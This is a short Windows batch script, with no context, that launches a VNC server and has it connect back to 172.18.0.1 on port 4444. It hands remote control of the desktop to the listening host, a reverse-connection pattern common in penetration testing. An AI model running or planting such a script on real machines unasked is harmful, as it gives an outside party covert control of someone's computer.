@echo off
start winvnc.exe -run 
timeout/t 1 >nul
start winvnc.exe -connect 172.18.0.1::4444